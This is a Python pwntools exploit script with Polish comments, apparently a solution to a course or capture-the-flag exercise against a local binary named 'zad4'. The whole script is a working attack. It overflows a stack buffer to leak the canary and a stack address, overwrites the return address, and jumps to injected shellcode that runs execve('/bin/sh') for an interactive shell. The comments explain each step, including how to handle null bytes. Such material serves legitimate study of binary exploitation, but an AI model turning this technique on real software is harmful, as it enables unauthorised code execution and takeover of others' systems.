from pwn import *
context.arch = 'x86_64'

r = process("./zad4")

# Patrząc na układ stosu (w gdb zawartość pamięci + jej użycie w asemblerze),
# zobaczymy, że za naszym buforem jest 8 bajtów paddingu, potem kanarek, dalej
# zapisany adres poprzedniej ramki (rejestr rbp), a potem adres powrotu.

# Zapełniamy cały bufor (0x20 bajtów), jakiś padding (8) i pierwszy bajt
# kanarka, który zawsze jest nullem (1).
msg = b'a' * (0x28 + 1)
r.send(msg)

# Odbieramy wypisane bajty.
# Najpierw 0x28 literek 'a', które wysłaliśmy powyżej, potem 8 bajtów
# kanarka (z pierwszym nadpisanym przez nas literką 'a'), a potem 6 bajtów
# adresu (bo 2 górne zawsze będą nullami - adresy kanoniczne na x86).
# Uwaga! Powyższe zakłada, że ani w adresie ani w kanarku nie wylosuje się
# bajt zerowy (null byte). W pełni poprawne rozwiązanie obsługiwało by takie
# przypadki odbierając dane i sprawdzając ich długość - jeśli była by krótsza
# niż oczekiwana, to znaczy, że trafił się bajt zerowy. Możemy wtedy w kolejnym
# obrocie pętli (w funkcji `echo` w programie) wysłać więcej bajtów, które
# nadpiszą ten bajt zerowy (i wszystkie bajty wcześniejsze, ale je już znamy).
# Tym sposobem program odeśle nam dalsze bajty - możemy to powtarzać aż
# uzyskamy wszystkie interesujące nas bajty - kanarka i adresu stosu.
r.recvn(0x28)
cookie = r.recvn(8)
cookie = b'\x00' + cookie[1:]
stack = r.recvn(6)
stack = u64(stack + b'\x00\x00')
info("stack: " + hex(stack))

# W gdb możemy sprawdzić, że wycieknięty adres stosu wskazuje na miejsce
# zaraz za adresem powrotu. Możemy tam umieścić nasz shellcode i do niego
# skoczyć.

msg = b'a'*0x28   # bufor + padding
msg += cookie     # kanarek
msg += p64(0)     # zapisany rejestr rbp - nie interesuje nas jego wartość
msg += p64(stack) # adres powortu
msg += asm('''
    // execve("/bin/sh", NULL, NULL)
    lea rdi, [rip + sh_path]
    xor esi, esi
    xor edx, edx
    mov eax, 0x3b
    syscall

sh_path:
    .asciz "/bin/sh"
''')
r.send(msg)
r.recv()

r.send(b'exit')

r.interactive()

